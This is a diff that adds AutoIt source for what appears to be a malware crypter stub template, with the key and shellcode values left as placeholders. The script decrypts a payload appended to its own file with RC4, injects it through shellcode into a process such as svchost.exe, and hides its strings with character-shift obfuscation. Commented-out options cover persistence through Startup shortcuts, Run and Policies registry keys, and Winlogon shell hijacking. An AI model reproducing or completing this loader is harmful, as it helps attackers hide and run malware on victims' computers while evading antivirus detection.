@@ -1,0 +1,94 @@
+Main()
+Func Main()
+	$var21 = StringSplit(FileRead(@ScriptFullPath), func3("%FileSplit%", %Absolut_Key%), 1)
+	$var22 = $var21[2]
+	$var23 = func2($var22, func3("%EncryptionKey%", %Absolut_Key%))
+	;Internal func1($var23, @ScriptFullPath)
+	;External func1($var23, func3("C:\Windows\System32\svchost.exe", %Absolut_Key%))
+	
+	;Startpath  FileCreateShortcut(func3("#AppDataPath#", 13) & func3("%InstallFolder%", 13), @StartupDir & "\Win32.lnk", "", "", "", @SystemDir & "\shell32.dll", "", "4", @SW_MINIMIZE)
+	;Policies   RegWrite(func3("%PoliciesExplorerRun%", 12), func3("%KeyName%", 13), "REG_EXPAND_SZ", func3("#AppDataPath#", 13) & func3("%InstallFolder%", 13))
+	;Run		RegWrite(func3("%CurrentRun%", 12), func3("%KeyName%", 13), "REG_EXPAND_SZ", func3("#AppDataPath#", 13) & func3("%InstallFolder%", 13))
+	;Winlogon   RegWrite(func3("%RunWinlogon%", 12), "shell", "REG_SZ", func3("#AppDataPath#", 13) & func3("%InstallFolder%", 13) & ",explorer.exe")
+	;#CopyFile  FileCopy(@ScriptFullPath, @AppDataDir & func3("%InstallFolder%", 13), 1)
+	;#MoveFile  FileMove(@ScriptFullPath, @AppDataDir & func3("%InstallFolder%", 13), 1)	
+
+EndFunc
+
+ Func func2($var15, $var16)
+	Local $var11 = func3("#RC4_1#", %Int_RC4_1%)
+	Local $var12 = DllStructCreate(func3("#RC4_2#", %Int_RC4_2%) & BinaryLen($var11) & func3("#RC4_3#", %Int_RC4_3%))
+	DllStructSetData($var12, 1, $var11)
+	Local $var13 = DllStructCreate(func3("#RC4_2#", %Int_RC4_2%) & BinaryLen($var15) & func3("#RC4_3#", %Int_RC4_3%))
+	DllStructSetData($var13, 1, $var15)
+	DllCall(func3("#RC4_4#", %Int_RC4_4%), func3("%2_Call%", %Int_Key_37%), func3("#RC4_5#", %Int_RC4_5%), func3("%4_Call%", %Int_Key_39%), DllStructGetPtr($var12), func3("%4_Call%", %Int_Key_39%), DllStructGetPtr($var13), func3("%6_Call%", %Int_Key_41%), BinaryLen($var15), func3("#RC4_6#", %Int_RC4_6%), $var16, func3("%6_Call%", %Int_Key_41%), 0)
+	Local $var14 = DllStructGetData($var13, 1)
+	$var13 = 0
+	$var12 = 0
+	Return $var14
+EndFunc
+
+
+
+ Func func1($var01, $var02)
+	  Dim $var03 , $var04
+	  $var05 = func3("#Shellcode_1#", %Int_Key_1%) & _
+	  func3("#Shellcode_2#", %Int_Key_2%) & _
+	  func3("#Shellcode_3#", %Int_Key_3%) & _
+	  func3("#Shellcode_4#", %Int_Key_4%) & _
+	  func3("#Shellcode_5#", %Int_Key_5%) & _
+	  func3("#Shellcode_6#", %Int_Key_6%) & _
+	  func3("#Shellcode_7#", %Int_Key_7%) & _
+	  func3("#Shellcode_8#", %Int_Key_8%) & _
+	  func3("#Shellcode_9#", %Int_Key_9%) & _
+	  func3("#Shellcode_10#", %Int_Key_10%) & _
+	  func3("#Shellcode_11#", %Int_Key_11%) & _
+	  func3("#Shellcode_12#", %Int_Key_12%) & _
+	  func3("#Shellcode_13#", %Int_Key_13%) & _
+	  func3("#Shellcode_14#", %Int_Key_14%) & _
+	  func3("#Shellcode_15#", %Int_Key_15%) & _
+	  func3("#Shellcode_16#", %Int_Key_16%) & _
+	  func3("#Shellcode_17#", %Int_Key_17%) & _
+	  func3("#Shellcode_18#", %Int_Key_18%) & _
+	  func3("#Shellcode_19#", %Int_Key_19%) & _
+	  func3("#Shellcode_20#", %Int_Key_20%) & _
+	  func3("#Shellcode_21#", %Int_Key_21%) & _
+	  func3("#Shellcode_22#", %Int_Key_22%) & _
+	  func3("#Shellcode_23#", %Int_Key_23%) & _
+	  func3("#Shellcode_24#", %Int_Key_24%) & _
+	  func3("#Shellcode_25#", %Int_Key_25%) & _
+	  func3("#Shellcode_26#", %Int_Key_26%) & _
+	  func3("#Shellcode_27#", %Int_Key_27%) & _
+	  func3("#Shellcode_28#", %Int_Key_28%) & _
+	  func3("#Shellcode_29#", %Int_Key_29%) & _
+	  func3("#Shellcode_30#", %Int_Key_30%) & _
+	  func3("#Shellcode_31#", %Int_Key_31%) & _
+	  func3("#Shellcode_32#", %Int_Key_32%) & _
+	  func3("#Shellcode_33#", %Int_Key_33%) & _
+	  func3("#Shellcode_34#", %Int_Key_34%) & _
+	  func3("#Shellcode_35#", %Int_Key_35%)
+	  $var06 = BinaryLen($var05)
+	  $var07 = BinaryLen($var01)
+	  Dim $var08
+	  $var09 = 1
+	  While $var09 <= $var06
+	  $var10 = Number(Execute(BinaryMid($var05 , $var09 , 1)))
+	  $var08 &= Chr($var10)
+	  $var09 = $var09+1
+	  WEnd
+	  $var03 = DllStructCreate(func3("%1_Other%", %Int_Key_42%) & $var06 & func3("%2_Other%", %Int_Key_43%))
+	  $var04 = DllStructCreate(func3("%1_Other%", %Int_Key_42%) & $var07 & func3("%2_Other%", %Int_Key_43%))
+	  DllStructSetData($var03, 1, $var08)
+	  DllStructSetData($var04, 1, $var01)
+	  Call ( DllCall(func3("%1_Call%", %Int_Key_36%), func3("%2_Call%", %Int_Key_37%), func3("%3_Call%", %Int_Key_38%), func3("%4_Call%", %Int_Key_39%), DllStructGetPtr($var03), func3("%5_Call%", %Int_Key_40%), $var02, func3("%4_Call%", %Int_Key_39%), DllStructGetPtr($var04), func3("%6_Call%", %Int_Key_41%), False, func3("%6_Call%", %Int_Key_41%), False))
+    EndFunc
+
+	Func func3($var17, $var18)
+Local $var19 , $var20 
+For $var20 = 1 To StringLen($var17)
+	$var19 = $var19 & Chr(Asc(StringMid($var17, $var20, 1)) - $var18)
+Next
+Return $var19
+EndFunc
+
+
